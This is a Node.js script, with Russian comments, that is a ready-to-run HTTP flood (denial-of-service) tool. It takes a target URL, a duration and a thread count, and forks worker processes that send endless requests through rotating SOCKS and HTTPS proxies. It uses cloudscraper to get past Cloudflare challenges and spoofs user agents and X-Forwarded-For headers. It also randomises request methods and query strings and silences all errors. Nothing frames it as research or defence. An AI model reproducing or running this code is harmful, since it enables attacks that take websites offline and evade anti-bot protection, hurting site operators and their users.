require('events').EventEmitter.defaultMaxListeners = Infinity;
const cloudscraper = require('cloudscraper');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const tough = require('tough-cookie');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const http2 = require('http2');
const userAgents = require('user-agents');
const cluster = require('cluster');

// Конфигурация
const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]) * 1000;
const REQUESTS_PER_THREAD = parseInt(process.argv[4]);
const PROXY_FILE = process.argv[5];
const THREADS = parseInt(process.argv[6]);

let proxies = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getProxyAgent(proxyUrl) {
    if (proxyUrl.startsWith('socks')) {
        return new SocksProxyAgent(proxyUrl);
    } else {
        return new HttpsProxyAgent(proxyUrl);
    }
}

async function flood() {
    while (true) {
        try {
            const proxy = proxies[randomInt(0, proxies.length - 1)];
            const agent = getProxyAgent(proxy.includes('://') ? proxy : `http://${proxy}`);

            const cookieJar = new tough.CookieJar();
            const headers = {
                'User-Agent': new userAgents({ deviceCategory: 'desktop' }).toString(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                'X-Forwarded-For': `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`
            };

            const options = {
                url: TARGET + '?' + crypto.randomBytes(8).toString('hex'),
                method: ['GET', 'POST', 'HEAD', 'OPTIONS'][randomInt(0, 3)],
                headers: headers,
                agent: agent,
                jar: cookieJar,
                timeout: 10000,
                followAllRedirects: true,
                challengesToSolve: 3,
                cloudflareMaxTimeout: 15000
            };

            await cloudscraper(options);
            console.log(`[+] Request sent through ${proxy}`);

            // Отправка дополнительных запросов
            for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
                setTimeout(() => {
                    cloudscraper(options).catch(() => {});
                }, randomInt(50, 300));
            }
        } catch (err) {
            continue;
        }
    }
}

if (cluster.isMaster) {
    console.log(`[!] Starting ${THREADS} threads with ${REQUESTS_PER_THREAD} requests each`);
    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }
} else {
    flood();
}

setTimeout(() => {
    console.log('[!] Attack finished');
    process.exit(0);
}, DURATION);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
